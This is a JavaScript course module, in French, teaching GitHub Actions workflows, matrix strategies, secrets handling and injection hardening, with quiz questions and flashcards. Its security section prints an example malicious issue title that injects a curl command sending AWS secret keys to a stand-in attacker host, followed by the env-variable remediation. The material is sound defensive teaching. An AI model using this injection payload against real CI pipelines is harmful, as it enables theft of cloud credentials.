/**
 * Chapitre 5 du cours « Git & GitHub B3 ».
 */
'use strict';

const { box } = require('../../../scripts/course-kit');

module.exports = {
  n: 5,
  title: 'Automatisation &amp; CI/CD avec GitHub Actions',
  short: 'CI/CD &amp; GitHub Actions',
  toc: 'Syntaxe déclarative YAML, événements déclencheurs, runners, stratégie matricielle multi-plateforme (strategy.matrix), gestion des secrets et durcissement contre les injections de commandes.',
  time: '≈ 2 h 45 de travail',
  free: false,
  lockLabel: 'Réservé B3 et plus',
  situation: 'Dans les organisations technologiques modernes, le dépôt Git ne se contente plus de stocker du code : il est devenu le moteur central de l’automatisation du cycle de vie logiciel (DevOps). Grâce à GitHub Actions, chaque événement (push, création de Pull Request, publication de release, planification cron) peut déclencher des pipelines d’intégration et de déploiement continus (CI/CD). Cependant, écrire des fichiers de workflow sans maîtrise de la sécurité expose l’entreprise à des risques dévastateurs : exécution de code malveillant via des injections shell non filtrées, vol de secrets de production (clés cloud AWS/Azure) ou fuite de paquets contrefaits. L’ingénieur de niveau Bachelor 3 doit savoir concevoir des workflows performants et scalables avec des stratégies matricielles multi-plateformes, tout en appliquant un durcissement sécuritaire intransigeant.',
  objectives: [
    'maîtriser la syntaxe déclarative YAML des workflows GitHub Actions (.github/workflows/) ;',
    'comprendre l’architecture distribuée : événements déclencheurs, jobs parallèles/dépendants et runners hébergés ou auto-hébergés ;',
    'concevoir des matrices d’exécution (strategy.matrix) pour valider le code sur plusieurs systèmes d’exploitation et versions de langages ;',
    'identifier et neutraliser les failles critiques d’injection de commande shell dans les contextes dynamiques ${{ github.event... }} ;',
    'appliquer le principe du moindre privilège aux tokens d’authentification automatiques (GITHUB_TOKEN) via le bloc permissions ;',
    'développer en Python 3 des auditeurs de syntaxe de workflow, des expandeurs de matrices et des scanners de vulnérabilités CI/CD.'
  ],
  sections: [
    {
      title: 'Anatomie d’un Pipeline CI/CD : Workflows, Événements, Jobs &amp; Runners',
      html: [
        '<p>GitHub Actions est une plateforme d’automatisation intégrée dont la configuration repose sur des fichiers YAML stockés impérativement dans le répertoire <code>.github/workflows/</code> du dépôt.</p>',
        '<div class="grid grid-2">',
        '  <div class="card">',
        '    <h4>Structure Hiérarchique</h4>',
        '    <ul>',
        '      <li><strong>Workflow :</strong> Processus automatisé autonome défini dans un fichier <code>.yml</code>.</li>',
        '      <li><strong>Events (on:) :</strong> Événements déclencheurs (ex: <code>push</code>, <code>pull_request</code>, <code>workflow_dispatch</code>, <code>schedule</code>).</li>',
        '      <li><strong>Jobs :</strong> Ensemble d’étapes séquentielles exécutées sur le même environnement. Par défaut, les jobs s’exécutent <strong>en parallèle</strong> (sauf en cas d’utilisation de <code>needs:</code> pour créer un graphe acyclique de dépendances).</li>',
        '      <li><strong>Runners (runs-on:) :</strong> Machines virtuelles (Ubuntu, Windows, macOS) ou conteneurs exécutant le job.</li>',
        '    </ul>',
        '  </div>',
        '  <div class="card">',
        '    <h4>Étapes &amp; Actions Réutilisables</h4>',
        '    <p>Chaque job est constitué d’une liste ordonnée de <code>steps</code> :</p>',
        '    <ul>',
        '      <li><code>uses:</code> : Invoque une action communautaire ou interne (ex: <code>actions/checkout@v4</code> pour cloner le code, <code>actions/setup-python@v5</code> pour installer l’interpréteur).</li>',
        '      <li><code>run:</code> : Exécute des commandes en ligne de commande dans le shell natif (bash, sh, powershell).</li>',
        '      <li><code>env:</code> : Définit des variables d’environnement locales à l’étape.</li>',
        '    </ul>',
        '  </div>',
        '</div>'
      ].join('\n')
    },
    {
      title: 'Stratégie Matricielle (strategy.matrix) : Parallélisation Multi-Axes',
      html: [
        '<p>Pour tester une bibliothèque sur une multitude de configurations sans dupliquer des dizaines de fichiers de workflow, GitHub Actions propose la <strong>stratégie matricielle</strong> :</p>',
        '<pre><code>jobs:\n  test:\n    runs-on: \${{ matrix.os }}\n    strategy:\n      fail-fast: false\n      matrix:\n        os: [ubuntu-latest, windows-latest, macos-latest]\n        python-version: ["3.10", "3.11", "3.12"]\n        include:\n          - os: ubuntu-latest\n            python-version: "3.13-dev"\n        exclude:\n          - os: windows-latest\n            python-version: "3.10"</code></pre>',
        box('standard', 'Mécanique du Produit Cartésien &amp; Options Avancées', [
          '<p>Le moteur calcule le produit cartésien de tous les axes déclarés : dans l’exemple ci-dessus, $3 \\times 3 = 9$ jobs sont instanciés en parallèle, auxquels s’ajoute 1 job spécifique via <code>include:</code> et se soustrait 1 combinaison incompatible via <code>exclude:</code>, soit 9 jobs au total.</p>',
          '<p>La directive <code>fail-fast: false</code> est capitale : par défaut (<code>true</code>), dès qu’un job échoue, GitHub annule tous les autres jobs de la matrice. En la fixant à <code>false</code>, on observe le résultat complet sur toutes les plateformes pour diagnostiquer les incompatibilités d’OS.</p>'
        ])
      ].join('\n')
    },
    {
      title: 'Sécurité des Workflows : Faille Critique d’Injection de Commande Shell',
      html: [
        '<p>L’erreur de sécurité la plus répandue et la plus destructrice dans GitHub Actions est l’<strong>injection directe de variables de contexte dans un script shell</strong> (CWE-78 : OS Command Injection).</p>',
        box('danger', 'Anatomie d’une Faille d’Injection dans un bloc run:', [
          '<p>Soit le step apparemment anodin suivant réagissant à l’ouverture d’une issue :</p>',
          '<pre><code>- name: Verifier titre issue\n  run: echo "Nouveau titre : \${{ github.event.issue.title }}"</code></pre>',
          '<p>Comme GitHub Actions résout l’expression <code>\${{ ... }}</code> par substitution textuelle brute <strong>avant</strong> de passer le script au shell bash, un attaquant qui soumet une issue avec le titre suivant :</p>',
          '<pre><code>Test"; curl -s https://evil.attacker/exfil?token=$AWS_SECRET_ACCESS_KEY; echo "Fin</code></pre>',
          '<p>provoquera l’exécution directe de la commande arbitraire <code>curl</code> dans le runner, exfiltrant les secrets du dépôt !</p>',
          '<p><strong>Remédiation obligatoire :</strong> Toujours passer les entrées non fiables par des <strong>variables d’environnement intermédiaires</strong> :</p>',
          '<pre><code>- name: Traitement securise\n  env:\n    ISSUE_TITLE: \${{ github.event.issue.title }}\n  run: echo "Nouveau titre : \$ISSUE_TITLE"</code></pre>'
        ])
      ].join('\n')
    },
    {
      title: 'Secrets de Dépôt, Principe du Moindre Privilège &amp; GITHUB_TOKEN',
      html: [
        '<p>La gestion des identifiants et des accès dans les pipelines d’intégration continue repose sur deux piliers majeurs :</p>',
        '<div class="grid grid-2">',
        '  <div class="card">',
        '    <h4>1. Les Secrets GitHub (Encrypted Secrets)</h4>',
        '    <ul>',
        '      <li>Stockés sous forme chiffrée (NaCl box) sur les serveurs GitHub.</li>',
        '      <li>Accessibles uniquement dans les workflows via <code>\${{ secrets.NOM_SECRET }}</code>.</li>',
        '      <li>GitHub masque automatiquement (redaction) la valeur du secret dans les logs console en remplaçant la chaîne par <code>***</code>.</li>',
        '    </ul>',
        '  </div>',
        '  <div class="card">',
        '    <h4>2. Le Token Automatique GITHUB_TOKEN</h4>',
        '    <p>Généré dynamiquement au début de chaque job et révoqué à la fin. Pour éviter qu’un attaquant exploitant une faille de dépendance n’utilise ce token pour écraser le code du dépôt, on applique le <strong>principe du moindre privilège</strong> :</p>',
        '    <pre><code>permissions:\n  contents: read\n  issues: write\n  pull-requests: read</code></pre>',
        '    <p>Tout droit non explicitement mentionné est strictement révoqué.</p>',
        '  </div>',
        '</div>'
      ].join('\n')
    }
  ],
  methodTitle: 'Méthode d’Ingénierie : Durcissement d’un Pipeline CI/CD GitHub Actions',
  method: [
    'Étape 1 : Structurer le workflow avec les déclencheurs les plus stricts possibles (ex: on: pull_request avec branches: [main]).',
    'Étape 2 : Épingler les actions communautaires avec leur hash de commit SHA complet plutôt qu’un tag mutable (ex: actions/checkout@b4ffde...).',
    'Étape 3 : Restreindre systématiquement les permissions du token d’exécution en tête de fichier via permissions: { contents: read }.',
    'Étape 4 : Scanner tous les blocs run: pour s’assurer qu’aucune expression ${{ github.event... }} n’est insérée directement dans une commande shell.',
    'Étape 5 : Isoler les secrets de déploiement au sein d’Environments GitHub avec règles d’approbation manuelle (Reviewers obligatoires).',
    'Étape 6 : Activer le timeout maximal (timeout-minutes: 15) pour éviter qu’un job bloqué ne consomme tout le quota de l’organisation.'
  ],
  summary: [
    'Les workflows GitHub Actions sont déclarés en YAML sous .github/workflows/.',
    'Un workflow réagit à des événements (on:), organise des jobs parallèles ou séquentiels (needs:) exécutés sur des runners.',
    'strategy.matrix génère le produit cartésien d’axes d’exécution (OS, versions) pour tester en parallèle.',
    'fail-fast: false permet de poursuivre les tests sur toutes les configurations même si l’une d’elles échoue.',
    'Ne JAMAIS concaténer ${{ github.event... }} dans un run: shell : risque majeur d’injection de commande (CWE-78).',
    'Toujours passer les données dynamiques par le bloc env: pour que le shell les traite comme de simples variables textuelles.',
    'Configurer systématiquement les permissions du GITHUB_TOKEN selon le principe du moindre privilège.'
  ],
  checklist: [
    'Je sais structurer un fichier de workflow valide avec les sections on, jobs et steps.',
    'Je comprends la différence entre l’exécution par défaut des jobs en parallèle et séquentielle via needs:.',
    'Je sais concevoir une matrice strategy.matrix avec inclusions et exclusions personnalisées.',
    'Je sais identifier et corriger une faille d’injection de commande dans un step de workflow.',
    'Je sais restreindre les droits d’un workflow avec la directive déclarative permissions:.',
    'Je sais utiliser les secrets GitHub sans risque de fuite dans les journaux d’exécution.'
  ],
  notions: [
    'Workflows déclaratifs YAML',
    'Événements déclencheurs (push, PR, cron)',
    'Runners hébergés & auto-hébergés',
    'Stratégie matricielle (strategy.matrix)',
    'Directive fail-fast',
    'Injection de commande shell (CWE-78)',
    'Variables d’environnement intermédiaires (env:)',
    'Principe du moindre privilège & GITHUB_TOKEN'
  ],
  pitfalls: [
    'Écrire ${{ github.head_ref }} ou ${{ github.event... }} directement dans un script bash exécuté dans run:.',
    'Laisser les permissions par défaut en lecture/écriture complète pour le GITHUB_TOKEN sur tous les dépôts.',
    'Faire un echo d’un secret dans un fichier temporaire qui est ensuite archivé comme artifact public du workflow.',
    'Oublier le drapeau fail-fast: false lorsqu’on souhaite obtenir le rapport de test complet sur tous les OS.'
  ],
  questions: [
    {
      stem: 'Dans quel sous-dossier exact du dépôt les fichiers de workflow GitHub Actions doivent-ils être impérativement enregistrés ?',
      opts: [
        '.github/actions/',
        '.github/workflows/',
        '.git/workflows/',
        'ci/pipelines/'
      ],
      correct: 1,
      exp: 'GitHub lit exclusivement les fichiers de définition de workflow au format YAML situés dans le répertoire .github/workflows/ à la racine du dépôt.'
    },
    {
      stem: 'Quel est le comportement d’exécution par défaut de deux jobs déclarés au même niveau dans un workflow si aucune directive « needs: » n’est précisée ?',
      opts: [
        'Ils s’exécutent en série l’un après l’autre dans l’ordre du fichier',
        'Ils s’exécutent en parallèle simultanément sur des runners indépendants',
        'Le premier bloque l’exécution du second jusqu’à approbation manuelle',
        'Le second écrase automatiquement les résultats du premier'
      ],
      correct: 1,
      exp: 'Par défaut, tous les jobs d’un workflow sont indépendants et s’exécutent en parallèle, sauf si une dépendance explicite est introduite via le mot-clé needs:.'
    },
    {
      stem: 'Pourquoi l’instruction « run: echo "Branche : ${{ github.head_ref }}" » représente-t-elle une vulnérabilité critique ?',
      opts: [
        'Parce que GitHub Actions ne supporte pas la commande echo sous Linux',
        'Parce qu’un attaquant peut nommer sa branche avec des métacaractères shell pour exécuter du code arbitraire',
        'Parce que le nom de branche est effacé par le runner avant l’exécution',
        'Parce que cette syntaxe consomme deux fois plus de crédits de calcul'
      ],
      correct: 1,
      exp: 'L’expression ${{ github.head_ref }} est substituée textuellement avant l’appel du shell : un nom de branche contenant des points-virgules ou guillemets permet d’injecter des commandes malveillantes (Command Injection).'
    },
    {
      stem: 'Quelle est la méthode recommandée pour assainir l’utilisation d’un paramètre dynamique issu de l’événement GitHub dans un script shell ?',
      opts: [
        'L’encoder en base64 dans le message de commit',
        'Le déclarer dans le bloc « env: » de l’étape et manipuler la variable d’environnement correspondante dans le script',
        'Désactiver l’interpréteur bash au profit de sh standard',
        'Exécuter le workflow uniquement sur des machines Windows'
      ],
      correct: 1,
      exp: 'En passant la valeur via le bloc env: (ex: BRANCH: ${{ github.head_ref }}), le moteur transmet la donnée comme valeur d’environnement et le shell ne tente pas de l’interpréter comme du code exécutable.'
    },
    {
      stem: 'Que produit la directive « strategy.matrix » avec os: [ubuntu, windows] et node: [18, 20] ?',
      opts: [
        'Exactement 2 jobs (ubuntu avec 18, et windows avec 20)',
        'Exactement 4 jobs correspondant au produit cartésien de tous les axes',
        '1 seul job qui alterne les systèmes d’exploitation',
        'Une erreur de syntaxe si le mot-clé axes: n’est pas spécifié'
      ],
      correct: 1,
      exp: 'strategy.matrix calcule le produit cartésien : 2 systèmes × 2 versions = 4 jobs indépendants exécutés en parallèle.'
    },
    {
      stem: 'Que provoque la directive « fail-fast: false » au sein d’une stratégie matricielle ?',
      opts: [
        'Le workflow s’arrête immédiatement dès qu’un job réussit',
        'Tous les autres jobs de la matrice continuent de s’exécuter même si l’un d’eux échoue',
        'Les erreurs de tests sont ignorées et le statut final est toujours vert',
        'La matrice est exécutée séquentiellement pour économiser de la mémoire'
      ],
      correct: 1,
      exp: 'Par défaut (fail-fast: true), l’échec d’un job stoppe immédiatement tous les autres. En fixant fail-fast: false, on permet à chaque configuration de mener ses tests à terme pour avoir un diagnostic complet.'
    },
    {
      stem: 'Comment restreindre les droits du token d’authentification automatique à la seule lecture du code source dans un workflow ?',
      opts: [
        'permissions: { contents: read }',
        'security: { read-only: true }',
        'auth: { level: minimal }',
        'token: { write: false }'
      ],
      correct: 0,
      exp: 'Le bloc déclaratif standard permissions: permet de spécifier les scopes autorisés, ici contents: read pour autoriser uniquement la lecture du dépôt.'
    },
    {
      stem: 'Pourquoi est-il fortement conseillé d’épingler les actions tierces par leur hash de commit complet (ex: uses: actions/checkout@b4ffde...) ?',
      opts: [
        'Pour accélérer le téléchargement depuis le cache local',
        'Pour se prémunir contre la compromission d’un tag de version mutable sur le dépôt de l’action (Supply Chain Attack)',
        'Parce que GitHub refuse d’exécuter les actions référencées par des tags',
        'Pour rendre l’action compatible avec Windows et macOS'
      ],
      correct: 1,
      exp: 'Un tag (comme @v4) est une référence modifiable par le propriétaire du dépôt de l’action : un attaquant qui compromettrait ce dépôt pourrait y pousser du code hostile. Le hash SHA immuable garantit l’intégrité absolue.'
    }
  ],
  flashcards: [
    {
      q: 'Dans quel dossier doit résider un workflow GitHub Actions ?',
      a: 'Dans le répertoire masqué .github/workflows/ à la racine du dépôt, sous forme de fichier YAML (.yml ou .yaml).'
    },
    {
      q: 'Que fait la directive strategy.matrix dans un job ?',
      a: 'Elle génère un produit cartésien de variables (ex: OS, versions de runtime) pour instancier automatiquement plusieurs jobs de test en parallèle.'
    },
    {
      q: 'Pourquoi l’injection d’expressions ${{ ... }} directement dans run: est-elle dangereuse ?',
      a: 'Parce que GitHub remplace le texte avant l’exécution : des métacaractères insérés par un attaquant dans un titre d’issue ou de branche peuvent détourner le script shell (Command Injection).'
    },
    {
      q: 'Comment immuniser un script shell contre l’injection de contexte GitHub ?',
      a: 'En passant la valeur dynamique via le bloc env: du step, puis en utilisant la variable d’environnement ($MA_VAR) dans le script.'
    },
    {
      q: 'À quoi sert la directive permissions: en tête de workflow ?',
      a: 'À appliquer le principe du moindre privilège en limitant strictement les droits accordés au GITHUB_TOKEN généré pour le job.'
    },
    {
      q: 'Que fait la directive fail-fast: false ?',
      a: 'Elle ordonne à GitHub Actions de ne pas annuler les autres jobs d’une matrice si l’un d’entre eux échoue.'
    }
  ],
  mastery: [
    {
      cls: 'low',
      text: 'Difficultés à écrire un workflow YAML basique ou utilisation naïve d’expressions dynamiques dans les commandes shell.'
    },
    {
      cls: 'medium',
      text: 'Bonne maîtrise de la syntaxe de workflow, utilisation des matrices strategy.matrix et passage des paramètres par variables d’environnement.'
    },
    {
      cls: 'high',
      text: 'Conception avancée de pipelines CI/CD sécurisés, épinglage cryptographique des actions, gestion du moindre privilège et durcissement anti-injections expert.'
    }
  ]
};
